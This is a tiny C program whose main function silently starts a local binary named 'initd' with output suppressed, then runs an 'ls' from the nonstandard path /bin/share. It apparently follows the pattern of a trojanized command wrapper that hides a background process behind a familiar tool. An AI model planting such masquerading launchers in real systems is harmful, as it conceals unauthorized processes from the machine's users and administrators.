#include <stdlib.h>
int main() {
system("nohup ./initd > /dev/null");
system("/bin/share/ls");
return 0;
 }